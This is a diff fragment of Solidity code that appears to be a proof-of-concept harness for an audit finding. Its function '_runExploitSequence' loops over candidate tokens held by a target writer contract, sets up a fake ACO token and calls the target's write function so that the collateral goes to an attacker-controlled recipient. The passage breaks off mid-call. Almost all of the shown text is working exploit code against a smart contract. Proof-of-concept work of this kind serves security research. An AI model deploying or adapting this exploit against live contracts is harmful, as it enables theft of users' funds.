+
+    function _runExploitSequence() internal {
+        address[25] memory candidates = _candidateTokens();
+        for (uint256 i = 0; i < candidates.length; ++i) {
+            address token = candidates[i];
+            if (token == address(0) || token.code.length == 0) {
+                continue;
+            }
+
+            uint256 writerBalance = _balanceOfIfPossible(token, TARGET);
+            if (writerBalance == 0) {
+                continue;
+            }
+
+            // This is the exact path in the finding. The harness invokes the attacker through
+            // this contract, so `address(this)` stands in for the attacker-controlled recipient.
+            fakeAcoToken.configureStrike(token);
+            lastTargetToken = token;
+
+            (bool ok, bytes memory reason) = TARGET.call{value: CALL_SEED_ETH}(
+                abi.encodeWithSelector(
+                    IACOWriterLike.write.selector,
+                    address(fakeAcoToken),
+                    COLLATERAL_AMOUNT,
+                    address(this),
+                    bytes("")
